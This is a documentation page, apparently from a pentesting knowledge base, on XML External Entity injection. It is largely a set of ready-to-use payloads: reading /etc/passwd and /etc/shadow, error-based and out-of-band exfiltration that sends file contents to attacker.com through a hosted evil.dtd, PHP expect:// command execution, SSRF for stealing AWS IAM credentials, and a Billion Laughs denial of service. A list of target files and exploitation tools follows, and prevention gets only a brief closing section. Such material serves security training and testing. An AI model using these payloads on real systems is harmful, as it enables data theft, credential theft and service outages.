---
sidebar_position: 30
---
# XML External Entity - XXE

XXE (XML External Entity) Injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It occurs when an XML parser processes external entity references within an XML input without proper security configurations. This can lead to the disclosure of confidential data, denial of service, server-side request forgery (SSRF), and even remote code execution (RCE) in some cases.

## How XXE Works: The Core Concept

XML documents can define "entities," which are essentially custom variables or shortcuts. An "external entity" is an entity whose value is loaded from an external source, often a file or a URL. XXE vulnerabilities arise when an XML parser is configured to resolve these external entities without sufficiently validating the external resources.

The attack leverages features of the XML specification that allow an XML document to include content from external URIs via a **Document Type Definition (DTD)**.

**Basic DTD Structure:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe "value"> ]>
<foo>&xxe;</foo>
```
Here, `&xxe;` refers to an internal entity `xxe`. An external entity would reference an external URI.

## Why XXE is Critical:

*   **Confidential Data Disclosure**: Read arbitrary files on the server's filesystem (e.g., `/etc/passwd`, cloud metadata, source code).
*   **Server-Side Request Forgery (SSRF)**: Make the application perform requests to internal or external systems.
*   **Denial of Service (DoS)**: Crash the application by feeding it recursively expanding entities (Billion Laughs Attack).
*   **Port Scanning**: Scan internal networks from the perspective of the vulnerable server.
*   **Remote Code Execution (RCE)**: In specific scenarios (e.g., PHP `expect://` wrapper enabled, or vulnerable Java deserialization).

## Detecting and Exploiting XXE

XXE typically involves submitting a specially crafted XML document to a vulnerable application endpoint. The success of the attack depends on the server's XML parser configuration and the available local resources/wrappers.  

## In-band XXE (Direct Data Exfiltration)
The attacker directly receives the output of the external entity within the application's response. This is the most straightforward form.  
### Retrieving Local Files (`file://` protocol)
#### Detection/Exploitation Payload
            ```xml
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <root>&xxe;</root>
            ```
**Explanation**: Defines an external entity `xxe` that loads the content of `/etc/passwd`. The `&xxe;` reference in the `root` element causes the parser to include this content in the response.  

**Common Files to Target**:  
*   `/etc/passwd` (Linux user accounts)
*   `/etc/shadow` (Linux hashed passwords - requires root or specific permissions)
*   `/etc/hosts`
*   `/etc/hostname`
*   `/proc/self/cmdline` (Linux current process command line)
*   `/proc/self/environ` (Linux environment variables)
*   AWS Metadata: `http://169.254.169.254/latest/meta-data/` (for cloud environments)
*   Windows: `C:\windows\win.ini`, `C:\boot.ini`  

### Error-Based XXE
 If the application doesn't return the content directly, an attacker might force an error message that reveals the content. This often requires nesting entities.  

#### Payload (Example with a remote DTD to trigger error reporting)
            ```xml
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY % remote_dtd SYSTEM "http://attacker.com/evil.dtd">
              %remote_dtd;
              %all;
            ]>
            <root>&send;</root>
            ```
##### `evil.dtd` hosted on `attacker.com`   

        ```xml
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; all SYSTEM 'php://filter/read=convert.base64-encode/resource=%file;'>">
        %eval;
        ```

**Explanation**: This complex payload fetches `evil.dtd`. The `evil.dtd` then attempts to read `/etc/passwd` and wrap it in a base64-encode filter (specific to PHP) inside a new entity `%all`. When `%all` is then referenced and fails to be parsed as a valid DTD, the error message might contain the base64-encoded file content.  

### PHP `expect://` Wrapper (for RCE)
If the PHP `expect` extension is loaded, the `expect://` wrapper can be used for remote code execution.
#### Payload
            ```xml
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "expect://id">
            ]>
            <root>&xxe;</root>
            ```
**Explanation**: If the `expect` wrapper is active, this will execute the `id` command and return its output in the response.  

## Blind XXE (Out-of-band Data Exfiltration)
The application processes the external entity but does not return its content directly in the response. The attacker needs an out-of-band channel (e.g., DNS lookup or HTTP request to an attacker-controlled server) to confirm the vulnerability and exfiltrate data.  

**Requirements**: The XML parser must be configured to make HTTP/DNS requests to external resources.  

### Basic Out-of-band Detection (using HTTP/DNS callback)
#### Payload (using Parameter Entity)
            ```xml
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY % xxe SYSTEM "http://attacker.com/xxe_test.txt">
              %xxe;
            ]>
            <root>Test</root>
            ```
**Explanation**: The `xxe` entity requests a resource from `attacker.com`. If `attacker.com` receives this HTTP request (or DNS lookup), the XXE is confirmed.  

**Tool**: Use a service like Burp Collaborator, interact.sh, or a simple Python HTTP server to monitor for incoming requests.  

### Out-of-band Data Exfiltration (using Parameter Entities and an external DTD)
#### Payload (sent to target)  
            ```xml
            <?xml version="1.0"?>
            <!DOCTYPE foo [
              <!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
              <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
              %dtd;
              %send;
            ]>
            <root>Test</root>
            ```
- **`evil.dtd` hosted on `attacker.com`**:  
            ```xml
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; all SYSTEM 'http://attacker.com/leak?data=%file;'>">
            %eval;
            ```
**Explanation**: The target requests `evil.dtd`. `evil.dtd` reads `/etc/passwd` into `%file`. Then, another entity `%eval` is defined which attempts to make an HTTP request to `attacker.com/leak` with the content of `%file` in the `data` parameter. The attacker monitors `attacker.com` for this incoming request, which will contain the contents of `/etc/passwd`.  

## XXE for Server-Side Request Forgery (SSRF)**
Use XXE to make the application request URLs on behalf of the attacker, targeting internal systems or cloud metadata endpoints.  
#### Payload
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-full-access">
        ]>
        <root>&xxe;</root>
        ```
**Explanation**: This attempts to retrieve AWS IAM credentials from the EC2 instance metadata service. The application's response will contain these credentials if successful (in-band) or a network request will be made to the internal IP (blind).  

## XXE for Denial of Service (DoS) - Billion Laughs Attack**
This attack aims to crash the XML parser by defining recursively expanding entities. The small XML document rapidly grows in memory, consuming all available resources.  
#### Payload
        ```xml
        <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
        ```
**Explanation**: `lol` expands to "lol", `lol2` expands to 10 "lol"s, `lol3` expands to 100 "lol"s, and so on. `lol9` will expand to 1 billion "lol"s, rapidly consuming memory.  

## Identifying XML Endpoints

**Content-Type Header**:  
Look for `Content-Type: application/xml` or `text/xml` in HTTP requests.  

**File Extensions**:  
URLs ending in `.xml`, `.svg` (SVG is XML), `.wsdl`, `.dtd`, `.rss`, `.atom`.  

**SOAP/WSDL Endpoints**:  
Often use XML in their requests and responses.  

**POST Bodies**:  
Inspect HTTP POST requests for XML content.  

**API Documentation**:  
APIs might specify XML as a supported input format.  

## Tools for Exploitation

### Burp Suite (Manual & Extensions)
**Repeater**: Manually inject XXE payloads into XML requests.  

**Decoder**: URL encode payloads as needed.  

**Burp Collaborator**: Essential for detecting blind/out-of-band XXE vulnerabilities by generating unique domains that log DNS/HTTP interactions.  

**Extensions**: Search the BApp Store for XXE-specific extensions that might automate payload generation or detection.  

**OWASP ZAP**: Can also be used for manual injection and some automated scanning might detect common XXE patterns.  

**Manual Crafting**: Often, the most reliable way to find XXE is by carefully crafting payloads based on the application's XML structure.  

## Prevention (Briefly)

**Disable External Entities**: Configure the XML parser to entirely disable the processing of external entities. This is the most effective defense.  
**Disable DTDs**: If possible, disable DTDs altogether.  
**Input Validation**: Validate and sanitize XML inputs before parsing.  
**Use Safe XML Parsers**: Ensure your application uses an XML parser that, by default, disables external entities or provides easy configuration to do so.  